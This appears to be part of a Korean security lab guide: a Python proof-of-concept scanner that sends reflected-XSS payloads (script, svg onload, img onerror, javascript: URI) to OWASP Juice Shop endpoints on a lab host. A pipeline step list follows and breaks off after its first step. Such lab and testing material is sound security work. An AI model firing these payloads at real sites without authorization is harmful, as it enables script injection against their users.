    ## 💻 PoC (python)

    ```python
    #!/usr/bin/env python3
    """XSS 자동 탐지 파이프라인 mini PoC"""
    import requests
    from urllib.parse import urlencode, quote

    BASE = "http://juice.6v6.lab"
    PAYLOADS = [
        "<script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
    ]
    PARAMS = ["q", "email", "name", "comment"]

    def test(url, param, payload):
        r = requests.get(url, params={param: payload}, timeout=10)
        # 반사 확인 (server reflect)
        if payload in r.text:
            return f"  [REFLECTED] {url}?{param}={payload[:30]}"
        return None

    # crawl 시뮬 — Juice Shop 의 main endpoint
    endpoints = [
        f"{BASE}/rest/products/search",
        f"{BASE}/api/Users",
        f"{BASE}/rest/user/whoami",
    ]
    findings = []
    for ep in endpoints:
        for p in PARAMS:
            for payload in PAYLOADS:
                result = test(ep, p, payload)
                if result: findings.append(result)

    print(f"=== XSS scan results: {len(findings)} reflected ===")
    for f in findings[:10]: print(f)
    ```

    ## 📋 파이프라인 단계
    1. **Crawl** — wget --recursive 또는 Playwright 자동 클릭
